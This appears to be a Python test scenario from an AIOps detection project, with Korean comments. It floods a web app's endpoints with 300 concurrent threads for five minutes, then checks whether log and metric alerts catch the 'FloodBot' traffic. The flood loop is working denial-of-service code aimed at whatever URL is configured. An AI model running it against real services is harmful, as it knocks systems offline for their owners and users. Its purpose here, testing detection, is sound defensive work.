"""
HTTP Flood Attack (Application-Level DoS)
OWASP API4:2023 - Unrestricted Resource Consumption

Rate limiting이 없는 엔드포인트에 다수 동시 HTTP 요청을 전송하여
백엔드 스레드 풀을 고갈시키고 CPU를 급등시킵니다.

탐지 포인트: CPU 스파이크 + 요청 처리 지연
AIOps 포인트: 메트릭(CPU↑) + 로그(slow response)의 상관관계
"""

import ssl
import json
import os
import time
import urllib.request
import urllib.error
import urllib.parse
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor
import sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from common.verifier import ScenarioVerifier, VerifyResult


# ── 설정 ───────────────────────────────────────────────────────────────────────
SCRIPT_DIR   = os.path.dirname(os.path.abspath(__file__))
LOG_PATH     = os.path.normpath(os.path.join(SCRIPT_DIR, "..", "logs", "anomaly_log.json"))

TARGET_BASE = os.getenv("TARGET_URL", "http://localhost:80")
WORKERS      = 300       # 동시 요청 스레드 수
DURATION_SEC = 300      # 공격 지속 시간(초)

TARGET_ENDPOINTS = [
    "/api/v1/my-plants",
    "/api/v1/schedules",
    "/api/v1/users/me",
    "/home",
    "/",
]

_ssl_ctx = ssl.create_default_context()
_ssl_ctx.check_hostname = False
_ssl_ctx.verify_mode = ssl.CERT_NONE


# ── 로그 유틸 ──────────────────────────────────────────────────────────────────
def _load_log() -> list:
    if os.path.exists(LOG_PATH) and os.path.getsize(LOG_PATH) > 0:
        with open(LOG_PATH, "r", encoding="utf-8") as f:
            return json.load(f)
    return []

def _save_log(records: list) -> None:
    os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
    with open(LOG_PATH, "w", encoding="utf-8") as f:
        json.dump(records, f, indent=2, ensure_ascii=False)

def _send_pipeline_webhook(payload: dict) -> bool:
    import urllib.request, json
    try:
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            "http://localhost:8000/webhook/alert",
            data=data,
            headers={"Content-Type": "application/json"},
        )
        urllib.request.urlopen(req, timeout=5)
        return True
    except Exception as e:
        print(f"[!] Pipeline 웹훅 전송 실패: {e}")
        return False


def record_event(scenario, start, end, status, detail=""):
    records = _load_log()
    records.append({
        "scenario": scenario, "category": "infra",
        "start_time": start, "end_time": end,
        "status": status, "detail": detail,
    })
    _save_log(records)
    print(f"[LOG] {scenario} | {status} | {start} → {end}")


# ── 단건 요청 ──────────────────────────────────────────────────────────────────
def _send_one() -> tuple[int, float]:
    import random
    endpoint = random.choice(TARGET_ENDPOINTS)
    url = f"{TARGET_BASE}{endpoint}"
    t0 = time.time()
    try:
        req = urllib.request.Request(
            url,
            headers={"User-Agent": "FloodBot/1.0", "Accept": "*/*"},
        )
        r = urllib.request.urlopen(req, context=_ssl_ctx, timeout=5)
        return r.status, (time.time() - t0) * 1000
    except urllib.error.HTTPError as e:
        return e.code, (time.time() - t0) * 1000
    except Exception:
        return 0, (time.time() - t0) * 1000


# ── 메인 ───────────────────────────────────────────────────────────────────────
def main():
    scenario = "http_flood"

    # ── verifier 초기화 ──
    verifier = ScenarioVerifier(
        scenario_name="http_flood",
        alert_name="HttpFlood",
        hypothesis="대량 HTTP 요청 시 Nginx 로그에서 FloodBot 트래픽 탐지",
    )

    verifier.check_steady_state()
    verifier.print_hypothesis()
    verifier.start_timer()

    # ── 기존 공격 코드 (그대로) ──
    start_time = datetime.now(timezone.utc).isoformat()
    deadline   = time.time() + DURATION_SEC

    print(f"[*] 시나리오: HTTP Flood (OWASP API4:2023 - Unrestricted Resource Consumption)")
    print(f"[*] 대상: {TARGET_BASE}")
    print(f"[*] 동시 스레드: {WORKERS} / 지속: {DURATION_SEC}초")
    print(f"[*] 공격 시작... (HighCpuUsage 탐지까지 약 1~2분 소요)")

    total = 0
    errors = 0
    status_counts: dict[int, int] = {}

    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        futures = []
        while time.time() < deadline:
            while len(futures) < WORKERS * 3 and time.time() < deadline:
                futures.append(pool.submit(_send_one))

            done, futures = futures[:WORKERS], futures[WORKERS:]
            for f in done:
                try:
                    code, ms = f.result(timeout=6)
                    total += 1
                    status_counts[code] = status_counts.get(code, 0) + 1
                    if code == 0:
                        errors += 1
                    if total % 200 == 0:
                        print(f"  → {total}건 전송 | 상태코드별: {dict(sorted(status_counts.items()))}")
                except Exception:
                    errors += 1
                    total += 1

    end_time = datetime.now(timezone.utc).isoformat()
    detail = json.dumps({
        "total_requests": total,
        "errors": errors,
        "status_counts": status_counts,
        "workers": WORKERS,
        "duration_sec": DURATION_SEC,
    }, ensure_ascii=False)

    record_event(scenario, start_time, end_time, "success" if total > 0 else "error", detail)
    print(f"\n[*] 완료: 총 {total}건 전송")
    print(f"[*] Prometheus alert 확인: http://localhost:9090/alerts")

    # ── 4단계: MTTD + MTTA ────────────────────────────────────────────────────
    _WEBHOOK_PAYLOAD = {
        "version": "4",
        "groupKey": "http_flood",
        "status": "firing",
        "alerts": [{
            "status": "firing",
            "labels": {"alertname": "HttpFlood", "severity": "critical", "container": "leafy-frontend"},
            "annotations": {"summary": "HTTP Flood 공격 탐지", "container": "leafy-frontend"},
            "startsAt": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }],
    }

    mttd = verifier.verify_loki(
        log_query='{container="frontend"}',
        keyword="FloodBot",
        timeout=180,
    )

    if mttd is not None:
        _send_pipeline_webhook(_WEBHOOK_PAYLOAD)

    loki_result = VerifyResult(
        success=mttd is not None,
        alert_name="HttpFlood",
        scenario_name="http_flood",
        mttd_seconds=mttd,
    )
    verifier.log_result(loki_result)

if __name__ == "__main__":
    main()
